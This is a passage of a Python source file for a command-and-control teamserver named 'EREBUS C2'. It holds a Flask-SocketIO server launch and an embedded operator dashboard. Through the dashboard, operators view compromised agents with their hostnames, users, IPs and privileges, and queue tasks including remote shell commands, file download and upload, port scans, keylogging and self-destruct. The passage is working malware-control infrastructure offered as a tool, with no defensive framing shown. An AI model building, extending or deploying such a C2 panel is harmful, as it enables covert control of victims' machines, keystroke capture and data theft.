  Result endpoint:               POST /a/out
  Heartbeat endpoint:            POST /a/hb
""")
        self.socketio.run(self.app, host=self.host, port=self.port,
                          ssl_context=self._ssl_ctx, debug=False, use_reloader=False)


# ---------------------------------------------------------------------------
# Dashboard HTML
# ---------------------------------------------------------------------------

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>EREBUS C2</title>
<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a0f;--bg2:#111118;--bg3:#1a1a25;--green:#00ff88;--red:#ff4455;
      --yellow:#ffcc00;--blue:#4499ff;--dim:#888;--border:#222233;--text:#d0d0e0}
body{font-family:'Courier New',monospace;background:var(--bg);color:var(--text);height:100vh;display:flex;flex-direction:column}
#header{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 16px;
        display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
#header h1{color:var(--red);font-size:1em;letter-spacing:.15em}
#auth{display:flex;gap:6px;align-items:center}
input{background:var(--bg3);color:var(--text);border:1px solid var(--border);
      padding:5px 8px;font-family:inherit;font-size:.85em;border-radius:3px}
input:focus{outline:none;border-color:var(--green)}
button{background:var(--bg3);color:var(--green);border:1px solid var(--green);
       padding:5px 12px;font-family:inherit;font-size:.85em;cursor:pointer;border-radius:3px}
button:hover{background:var(--green);color:var(--bg)}
button.red{color:var(--red);border-color:var(--red)}
button.red:hover{background:var(--red);color:var(--bg)}
#main{display:flex;flex:1;overflow:hidden}
#sidebar{width:260px;background:var(--bg2);border-right:1px solid var(--border);
         display:flex;flex-direction:column;flex-shrink:0}
#sidebar h3{padding:8px 12px;font-size:.8em;color:var(--dim);text-transform:uppercase;
            letter-spacing:.1em;border-bottom:1px solid var(--border)}
#agent-list{flex:1;overflow-y:auto}
.agent-row{padding:8px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:.1s}
.agent-row:hover{background:var(--bg3)}
.agent-row.selected{background:#1a2a1a;border-left:3px solid var(--green)}
.agent-name{font-size:.9em;color:var(--text)}
.agent-meta{font-size:.75em;color:var(--dim);margin-top:2px}
.badge{display:inline-block;padding:1px 6px;border-radius:10px;font-size:.7em;font-weight:bold}
.badge.active{background:#0a2a18;color:var(--green);border:1px solid var(--green)}
.badge.inactive{background:#2a2a0a;color:var(--yellow);border:1px solid var(--yellow)}
.badge.dead{background:#2a0a0a;color:var(--red);border:1px solid var(--red)}
.badge.pending{background:#111;color:var(--dim);border:1px solid var(--dim)}
#content{flex:1;display:flex;flex-direction:column;overflow:hidden}
#agent-detail{flex:1;display:flex;flex-direction:column;overflow:hidden}
#detail-header{padding:10px 16px;border-bottom:1px solid var(--border);background:var(--bg2);flex-shrink:0}
#detail-header h2{font-size:.95em;color:var(--green)}
#detail-meta{font-size:.78em;color:var(--dim);margin-top:4px}
#task-input{padding:10px 16px;border-bottom:1px solid var(--border);background:var(--bg2);
            display:flex;gap:6px;flex-shrink:0}
#task-input input{flex:1}
#task-type{width:130px}
#terminal{flex:1;overflow-y:auto;padding:12px 16px;background:var(--bg);font-size:.82em;line-height:1.5}
.t-prompt{color:var(--blue)}
.t-output{color:var(--text);white-space:pre-wrap;margin-left:2em}
.t-ok{color:var(--green)}
.t-err{color:var(--red)}
.t-info{color:var(--dim)}
#bottom{height:140px;border-top:1px solid var(--border);display:flex;flex-shrink:0}
#event-log{flex:1;overflow-y:auto;padding:6px 14px;font-size:.75em;background:var(--bg2)}
#event-log h3{color:var(--dim);font-size:.8em;margin-bottom:4px;text-transform:uppercase;letter-spacing:.08em}
.ev{margin:1px 0}
.ev-info{color:var(--dim)}
.ev-warn{color:var(--yellow)}
.ev-err{color:var(--red)}
.ev-audit{color:var(--blue)}
#ops-panel{width:180px;border-left:1px solid var(--border);padding:8px;background:var(--bg2);overflow-y:auto}
#ops-panel h3{font-size:.75em;color:var(--dim);text-transform:uppercase;margin-bottom:6px}
.op-row{font-size:.78em;padding:2px 0;color:var(--text)}
#no-agent{flex:1;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:.9em}
#login-banner{display:none}
</style>
</head>
<body>
<div id="header">
  <h1>⛧ EREBUS C2 TEAMSERVER</h1>
  <div id="auth">
    <input id="u" placeholder="operator" type="text" />
    <input id="p" placeholder="password" type="password" />
    <button onclick="doAuth()">Connect</button>
    <span id="auth-status" style="font-size:.8em;color:var(--dim)">disconnected</span>
  </div>
</div>
<div id="main">
  <div id="sidebar">
    <h3>Agents <span id="agent-count" style="color:var(--green)">0</span></h3>
    <div id="agent-list"></div>
  </div>
  <div id="content">
    <div id="no-agent">Select an agent to interact</div>
    <div id="agent-detail" style="display:none">
      <div id="detail-header">
        <h2 id="dh-title">-</h2>
        <div id="detail-meta"></div>
      </div>
      <div id="task-input">
        <select id="task-type" style="background:var(--bg3);color:var(--text);border:1px solid var(--border);padding:5px;font-family:inherit;font-size:.85em;border-radius:3px">
          <option value="shell">shell</option>
          <option value="download">download</option>
          <option value="upload">upload</option>
          <option value="proc_list">proc_list</option>
          <option value="file_list">file_list</option>
          <option value="port_scan">port_scan</option>
          <option value="keylog_start">keylog_start</option>
          <option value="keylog_stop">keylog_stop</option>
          <option value="sleep">sleep</option>
          <option value="selfdestruct">selfdestruct</option>
        </select>
        <input id="cmd" placeholder="command / path / argument..." />
        <button onclick="sendTask()">Execute</button>
        <button class="red" onclick="killAgent()">Kill</button>
      </div>
      <div id="terminal"><span class="t-info">» Select a task type and enter a command.</span></div>
    </div>
  </div>
</div>
<div id="bottom">
  <div id="event-log"><h3>Event Log</h3><div id="events"></div></div>
  <div id="ops-panel"><h3>Operators</h3><div id="ops"></div></div>
</div>

<script>
const socket = io({transports:['websocket']});
let selectedAgent = null;
const agents = {};

// -- Auth --
function doAuth(){
  socket.emit('op_auth',{username:document.getElementById('u').value,
                          password:document.getElementById('p').value});
}
document.getElementById('p').addEventListener('keydown',e=>{if(e.key==='Enter')doAuth();});
document.getElementById('cmd').addEventListener('keydown',e=>{if(e.key==='Enter')sendTask();});

socket.on('auth_ok',d=>{
  document.getElementById('auth-status').textContent='✓ '+d.token.slice(0,8)+'…';
  document.getElementById('auth-status').style.color='var(--green)';
  d.agents.forEach(addAgent);
  d.events.forEach(addEvent);
  (d.operators||[]).forEach(o=>addOp(o.username,o.role));
  appendTerminal('info','Connected to EREBUS C2 — '+d.agents.length+' agent(s) loaded.');
});
socket.on('auth_fail',d=>{
  document.getElementById('auth-status').textContent='✗ '+d.error;
  document.getElementById('auth-status').style.color='var(--red)';
});

// -- Agents --
socket.on('agent_new',a=>{addAgent(a);addEvent({level:'INFO',source:'agent',
  message:'New agent: '+a.hostname+' ('+a.username+'@'+a.ip+')',timestamp:new Date().toISOString()});});
socket.on('agent_update',a=>{agents[a.agent_id]=a;refreshAgentRow(a);});
socket.on('agent_status',d=>{
  if(agents[d.agent_id]){agents[d.agent_id].status=d.status;refreshAgentRow(agents[d.agent_id]);}
});

function addAgent(a){
  agents[a.agent_id]=a;
  const list=document.getElementById('agent-list');
  let row=document.getElementById('ar-'+a.agent_id);
  if(!row){row=document.createElement('div');row.className='agent-row';row.id='ar-'+a.agent_id;
    row.onclick=()=>selectAgent(a.agent_id);list.appendChild(row);}
  row.innerHTML=`<div class="agent-name">${a.hostname} <span class="badge ${a.status}">${a.status}</span></div>
    <div class="agent-meta">${a.username} · ${a.ip} · ${a.os}</div>`;
  document.getElementById('agent-count').textContent=Object.keys(agents).length;
}
function refreshAgentRow(a){addAgent(a);}

function selectAgent(id){
  selectedAgent=id;
  document.querySelectorAll('.agent-row').forEach(r=>r.classList.remove('selected'));
  const row=document.getElementById('ar-'+id);
  if(row)row.classList.add('selected');
  const a=agents[id];
  document.getElementById('no-agent').style.display='none';
  document.getElementById('agent-detail').style.display='flex';
  document.getElementById('dh-title').textContent=a.hostname+' › '+a.agent_id;
  document.getElementById('detail-meta').textContent=
    a.username+' · '+a.os+' · '+a.privileges+' · last seen '+a.last_seen.replace('T',' ').slice(0,19)+' UTC'
    +' · check-ins: '+a.checkin_count;
  socket.emit('get_agent_detail',{agent_id:id});
  clearTerminal();
  appendTerminal('info','Agent: '+id);
}

// -- Tasks --
function sendTask(){
  if(!selectedAgent)return;
  const cmd=document.getElementById('cmd').value.trim();
  const type=document.getElementById('task-type').value;
  if(!cmd)return;
  socket.emit('task_create',{agent_id:selectedAgent,command:cmd,type:type});
  appendTerminal('prompt','['+type+'] '+cmd);
  document.getElementById('cmd').value='';
}
function killAgent(){
  if(!selectedAgent)return;
  if(!confirm('Send SELFDESTRUCT to '+selectedAgent+'?'))return;
  socket.emit('task_create',{agent_id:selectedAgent,command:'selfdestruct',type:'selfdestruct'});
  appendTerminal('err','SELFDESTRUCT task queued for '+selectedAgent);
}

socket.on('task_created',t=>{if(t.agent_id===selectedAgent)
  appendTerminal('info','Task queued: '+t.task_id.slice(0,8)+' ['+t.type+'] '+t.command);});
socket.on('task_updated',t=>{if(t.agent_id===selectedAgent||t.task_id)
  appendTerminal('info','Task '+t.task_id.slice(0,8)+' → '+t.status);});
socket.on('task_result',d=>{
  if(d.agent_id===selectedAgent){
    appendTerminal(d.success?'ok':'err',d.output||'(no output)');
  }
});
socket.on('agent_detail',d=>{
  d.tasks.slice(0,8).forEach(t=>{
    appendTerminal('info','['+t.status+'] '+t.task_id.slice(0,8)+' '+t.type+' '+t.command);
  });
});

// -- Terminal helpers --
function appendTerminal(cls,text){
  const t=document.getElementById('terminal');
  const d=document.createElement('div');
  d.className='t-'+cls;
  d.textContent=text;
  t.appendChild(d);
  t.scrollTop=t.scrollHeight;
}
function clearTerminal(){document.getElementById('terminal').innerHTML='';}

// -- Events --
socket.on('server_event',e=>addEvent(e));
function addEvent(e){
  const c=document.getElementById('events');
  const d=document.createElement('div');
  d.className='ev ev-'+(e.level||'info').toLowerCase();
  d.textContent='['+e.timestamp.slice(11,19)+'] '+e.source+': '+e.message;
  c.appendChild(d);
  while(c.children.length>200)c.removeChild(c.firstChild);
  c.parentElement.scrollTop=c.parentElement.scrollHeight;
}

// -- Operators --
socket.on('operator_joined',o=>{addOp(o.username,o.role);appendTerminal('info','Operator joined: '+o.username);});
socket.on('operator_left',o=>{
  const el=document.getElementById('op-'+o.username);
  if(el)el.remove();
});
socket.on('op_chat',d=>{appendTerminal('info','[chat] '+d.from+': '+d.msg);});
function addOp(username,role){
  const ops=document.getElementById('ops');
  if(document.getElementById('op-'+username))return;
  const d=document.createElement('div');d.className='op-row';d.id='op-'+username;
  d.textContent='● '+username+' ('+role+')';
  ops.appendChild(d);
}
</script>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    server = TeamServer(host="0.0.0.0", port=8443)
    server.run()
